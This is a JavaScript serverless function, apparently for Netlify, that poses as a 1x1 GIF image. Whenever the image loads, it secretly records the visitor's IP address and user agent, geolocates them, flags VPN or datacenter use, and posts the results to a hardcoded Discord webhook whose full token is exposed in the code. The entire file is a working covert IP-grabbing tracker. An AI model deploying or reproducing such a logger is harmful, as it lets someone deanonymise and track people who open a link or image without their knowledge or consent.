exports.handler = async (event) => {
    const ip = event.headers['x-nf-client-connection-ip'] || 'unknown';
    const ua = event.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    let isVPN = false;
    let isProxy = false;
    let isDatacenter = false;
    let location = 'Unknown';
    let isp = 'Unknown';

    try {
        // ip-api.com — free, no key needed
        const resp = await fetch(`http://ip-api.com/json/${ip}?fields=query,country,city,isp,proxy,hosting`);
        const data = await resp.json();

        isVPN = data.proxy === true || data.hosting === true;
        isProxy = data.proxy === true;
        isDatacenter = data.hosting === true;
        location = `${data.city || ''}, ${data.country || ''}`.replace(/^, /, '') || 'Unknown';
        isp = data.isp || 'Unknown';
    } catch (err) {
        console.error('IP lookup failed', err);
    }

    const vpnStatus = isVPN ? '🚨 YES (VPN/Proxy detected)' : '✅ No (likely residential)';
    const details = isDatacenter ? ' (Datacenter IP)' : isProxy ? ' (Proxy)' : '';

    const message = `**Visitor Logged**\n` +
                    `IP: \`${ip}\`\n` +
                    `VPN/Proxy: ${vpnStatus}${details}\n` +
                    `Location: ${location}\n` +
                    `ISP: ${isp}\n` +
                    `Time: ${timestamp}\n` +
                    `UA: ${ua}`;

    try {
        await fetch('https://discord.com/api/webhooks/1525619686434279564/4WcjQ1_nAdgsHQtMRAXaww-wPg4vOwglWFwf3oTes7DpODl7I3sG1g129Vq1xr9_UNFZ', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error('Webhook failed', err);
    }

    return {
        statusCode: 200,
        headers: { 'Content-Type': 'image/gif' },
        body: 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
        isBase64Encoded: true
    };
};
